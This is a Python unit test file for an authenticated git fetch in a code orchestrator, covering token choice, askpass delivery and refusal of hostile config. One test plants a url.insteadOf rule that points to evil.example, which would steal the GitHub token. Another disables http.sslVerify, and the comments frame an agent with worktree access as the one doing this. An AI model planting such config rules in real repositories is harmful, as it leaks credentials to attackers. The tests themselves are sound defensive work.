# Copyright 2026 Geser Dugarov
# SPDX-License-Identifier: Apache-2.0
"""Target-root authenticated fetch owned by the branch transport."""

from __future__ import annotations

import unittest
from contextlib import ExitStack
from unittest.mock import MagicMock, patch

from orchestrator import config
from orchestrator.config import models as _config_models
from orchestrator.git import branch_transport
from tests.git.token_transport_test_support import (
    CACHE_BRANCH,
    MAIN_BRANCH,
    PRIVATE_REPO_SLUG,
    SECRET_TOKEN,
    SUBPROCESS_RUN,
    TOKEN_RESOLVER,
    _assert_hardened_fetch,
    _spec,
)
from tests.git.transport_helpers import (
    _GitRunRecorder,
    _temp_git_repo_with_local_config,
    _TokenResolver,
)

PRIVATE_REMOTE = "private"
SSL_VERIFY_KEY = "http.sslVerify"


def _private_spec() -> _config_models.RepoSpec:
    """Return the `REPOS` shape whose remote namespace is not `origin`."""
    return _spec(
        PRIVATE_REPO_SLUG,
        base_branch=CACHE_BRANCH,
        remote_name=PRIVATE_REMOTE,
    )


class AuthedTargetFetchTest(unittest.TestCase):
    """`_authed_target_fetch` replaces the plain `git fetch <remote> <branch>`
    invocations the worktree creators / per-tick base refresh used to run
    in `spec.target_root`. The plain form relied on git's ambient credential
    helper or session state, which fails under systemd (`GIT_TERMINAL_PROMPT=0`
    disables the prompt) and has no way to pick a per-repo token when the
    local clone has multiple GitHub-pointing remotes whose slug differs from
    `config.REPO`. Mirrors `AuthedFetchHardeningTest`'s shape but covers
    target-root semantics: token selection follows `spec.slug`,
    local-namespace ref selection follows `spec.remote_name`.
    """

    def test_uses_spec_token_and_remote_ref(self) -> None:
        # Acceptance criterion: a `REPOS` row like
        # `geserdugarov/lance-private|...|cache-branch|private` should
        # resolve its token from `~/.config/geserdugarov/lance-private/token`
        # (i.e. `spec.slug`) and write the fetched ref under
        # `refs/remotes/private/...` (i.e. `spec.remote_name`). Without
        # this split the bug surfaces as `fatal: could not read Username
        # for 'https://github.com'`.
        run_recorder = _GitRunRecorder()
        token_resolver = _TokenResolver()
        repo = _private_spec()

        with (
            patch(SUBPROCESS_RUN, side_effect=run_recorder),
            patch.object(config, TOKEN_RESOLVER, token_resolver),
        ):
            fetch = branch_transport._authed_target_fetch(repo, CACHE_BRANCH)

        self.assertEqual(fetch.returncode, 0)
        # Token resolved exactly once -- for the spec's slug, NOT the
        # `remote_name` (which is just a local namespace label).
        self.assertEqual(token_resolver.slugs, [PRIVATE_REPO_SLUG])
        self.assertEqual(
            run_recorder.env.get("GIT_TOKEN"),
            "ghp-token-for-geserdugarov-lance-private",
        )
        # Auth URL targets the spec's slug, NOT `remote_name`.
        self.assertIn(
            "https://x-access-token@github.com/geserdugarov/lance-private.git",
            run_recorder.args,
        )
        # The refspec writes under `refs/remotes/private/...`, NOT
        # `refs/remotes/origin/...` -- the local clone's `private` remote
        # is what the worktree creators anchor on.
        self.assertIn(
            "+refs/heads/cache-branch:refs/remotes/private/cache-branch",
            run_recorder.args,
        )
        # And the fetch runs in `spec.target_root` (the shared local clone).
        self.assertEqual(run_recorder.cwd, str(repo.target_root))

    def test_token_is_delivered_via_askpass_not_argv(self) -> None:
        # Same hardening as `_push_branch` / `_authed_fetch`: token in
        # GIT_TOKEN env var (read by a tempfile askpass), never in argv,
        # global/system config detached, hooks/fsmonitor/credential
        # helpers blocked.
        run_recorder = _GitRunRecorder()

        with (
            patch(SUBPROCESS_RUN, side_effect=run_recorder),
            patch.object(config, TOKEN_RESOLVER, return_value=SECRET_TOKEN),
        ):
            branch_transport._authed_target_fetch(_spec(), MAIN_BRANCH)

        _assert_hardened_fetch(self, run_recorder, SECRET_TOKEN)

    def test_root_url_rewrite_rule_is_refused(self) -> None:
        # The agent has write access to linked worktrees, and a linked
        # worktree can rewrite the parent clone's local config via
        # `git config --local`. Local config still applies even with
        # GIT_CONFIG_GLOBAL/SYSTEM detached, so a planted
        # `url.https://evil.example/.insteadOf https://github.com/`
        # would redirect the token-bearing fetch to the attacker host
        # and exfiltrate GIT_TOKEN. The pre-flight check must refuse.
        rewrite_check = MagicMock(
            returncode=0,
            stdout="url.https://evil.example/.insteadof https://github.com/\n",
            stderr="",
        )
        run_recorder = _GitRunRecorder(probe_result=rewrite_check)

        with (
            patch(SUBPROCESS_RUN, side_effect=run_recorder),
            patch.object(config, TOKEN_RESOLVER, return_value=SECRET_TOKEN),
        ):
            fetch = branch_transport._authed_target_fetch(_spec(), MAIN_BRANCH)

        # Only the rewrite probe ran; the token-bearing fetch did NOT.
        self.assertEqual(len(run_recorder.calls), 1)
        self.assertEqual(
            run_recorder.calls[0][:3],
            ["git", "config", "--get-regexp"],
        )
        self.assertNotEqual(fetch.returncode, 0)
        # And the token NEVER reached the (skipped) fetch subprocess env.
        for probe_argument in run_recorder.calls[0]:
            self.assertNotIn(SECRET_TOKEN, str(probe_argument))

    def test_local_ssl_verify_disable_is_refused(self) -> None:
        # A linked worktree can disable TLS verification in the parent clone's
        # local config via `git config --local http.sslVerify false`; the
        # token-bearing target fetch must fail closed on it, not just on url
        # rewrites. Real git config resolution (not a mocked probe) proves the
        # broadened regexp catches http.* transport keys.
        log_capture = MagicMock()
        with ExitStack() as stack:
            repo = stack.enter_context(
                _temp_git_repo_with_local_config([(SSL_VERIFY_KEY, "false")]),
            )
            stack.enter_context(
                patch.object(config, TOKEN_RESOLVER, return_value=SECRET_TOKEN),
            )
            log_capture.records = stack.enter_context(
                self.assertLogs(branch_transport.log, level="ERROR"),
            )
            fetch = branch_transport._authed_target_fetch(
                _config_models.RepoSpec(
                    slug="chippingway/orchestrator",
                    target_root=repo,
                    base_branch=MAIN_BRANCH,
                ),
                MAIN_BRANCH,
            )
        self.assertNotEqual(fetch.returncode, 0)
        logged = log_capture.records.output
        self.assertTrue(
            any("sslverify" in line.lower() for line in logged),
            f"expected sslVerify in refusal log, got {logged!r}",
        )

    def test_missing_token_fails_without_subprocess(self) -> None:
        # When the per-spec token file is missing, fail loudly with the
        # slug in the log -- a multi-repo deployment that forgot to drop
        # `~/.config/<slug>/token` gets a debuggable error rather than
        # a generic "could not read Username".
        subprocess_run = MagicMock()

        log_capture = MagicMock()
        with ExitStack() as stack:
            stack.enter_context(patch(SUBPROCESS_RUN, subprocess_run))
            stack.enter_context(
                patch.object(config, TOKEN_RESOLVER, return_value=""),
            )
            log_capture.records = stack.enter_context(
                self.assertLogs(branch_transport.log, level="ERROR"),
            )
            fetch = branch_transport._authed_target_fetch(
                _private_spec(), CACHE_BRANCH,
            )

        # Failed without ever shelling out.
        subprocess_run.assert_not_called()
        self.assertNotEqual(fetch.returncode, 0)
        # Slug is in the log so the operator knows which token file to fix.
        logged = log_capture.records.output
        self.assertTrue(
            any(PRIVATE_REPO_SLUG in line for line in logged),
            f"expected slug in log output, got {logged!r}",
        )


if __name__ == "__main__":
    unittest.main()
